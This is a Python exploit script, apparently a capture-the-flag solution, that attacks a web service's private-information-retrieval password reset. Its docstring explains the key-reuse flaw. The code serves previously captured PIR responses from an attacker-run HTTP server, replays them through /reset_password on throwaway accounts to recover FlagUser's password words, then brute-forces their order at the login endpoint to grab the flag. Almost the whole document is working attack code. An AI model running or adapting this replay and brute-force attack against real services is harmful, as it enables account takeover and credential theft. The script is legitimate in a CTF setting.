"""
Flag 2 (user): key reuse lets us reuse captured responses.

FlagUser's password was generated at boot by generate_password(CLIENT_USERS, ...).
The 6 PIR queries/responses from that run are still sitting in tmp/ if we grabbed
them at boot (see grab.py). Because reset_password uses the same CLIENT_USERS
key, we can replay each captured response back through reset_password on a throwaway
account: the server decodes it with the users key and sets our password to the
original word. Read it off our own account, repeat for all six, then brute the word
order against FlagUser's login.

Usage: python user.py <WEB_IP> <MY_VPN_IP> [PORT]   (needs grab_dump/ from grab.py)
"""
import glob, http.cookiejar, http.server, itertools, os, random, re, socketserver
import string, sys, threading, time, urllib.parse, urllib.request
from pir import parse_query_n

WEB_IP, MY_IP = sys.argv[1], sys.argv[2]
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
WEB = f"http://{WEB_IP}:8081"
PIR_RESP = "X-Application-Private-Information-Retrieval-Response"

queries = {os.path.basename(f)[:-6]: open(f, "rb").read() for f in glob.glob("grab_dump/*.query")}
responses = {os.path.basename(f)[:-9]: open(f, "rb").read() for f in glob.glob("grab_dump/*.response")}
print(f"[*] {len(queries)} queries, {len(responses)} responses")

groups = {}
for b, q in queries.items():
    groups.setdefault(parse_query_n(q), []).append(b)
keys = sorted(groups, key=lambda n: -len(groups[n]))
for i, n in enumerate(keys):
    print(f"    key#{i} {n.bit_length()} bits, {len(groups[n])} words")

current = [b""]
class Server(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length", 0)))
        self.send_response(200)
        self.send_header("Content-Type", PIR_RESP)
        self.send_header("Content-Length", str(len(current[0])))
        self.end_headers()
        self.wfile.write(current[0])

socketserver.TCPServer.allow_reuse_address = True
threading.Thread(target=lambda: socketserver.TCPServer(("0.0.0.0", PORT), Server).serve_forever(),
                 daemon=True).start()
time.sleep(0.4)

jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
def post(path, data):
    req = urllib.request.Request(WEB + path, urllib.parse.urlencode(data).encode(), method="POST")
    try:
        with op.open(req, timeout=120) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
def get(path):
    with op.open(WEB + path, timeout=60) as r:
        return r.read().decode(errors="replace")

def replay(resp):
    """Replay one captured response; return the word the server decodes it to."""
    current[0] = resp
    user = "r" + "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    post("/register", {"username": user, "password": "x"})
    st, _ = post("/reset_password", {"username": user, "wordlist": f"http://{MY_IP}:{PORT}/wl"})
    if st not in (200, 302):
        return None
    m = re.search(r"New main password[^<]*</b>:\s*<code>([^<]*)</code>", get("/"))
    return m.group(1).split()[0] if m else None

print("[*] finding the users key (the one that replays to a real word)...")
users = None
for n in keys:
    w = replay(responses[groups[n][0]])
    print(f"    key#{keys.index(n)} -> {w!r}")
    if w is not None:
        users = n
        break
if users is None:
    raise SystemExit("[-] no group decoded")

words = [replay(responses[b]) for b in groups[users]]
print("[*] FlagUser's words (unordered):", words)

print("[*] bruteforcing word order via FlagUser login...")
for perm in set(itertools.permutations(words)):
    pw = " ".join(perm)
    post("/login", {"username": "FlagUser", "password": pw})
    body = get("/")
    if "FlagUser's Passwords" in body:
        print("[+] password:", pw)
        print("[+] flag:", re.findall(r"PP\{[^}]*\}", body))
        break
else:
    print("[-] no permutation worked")
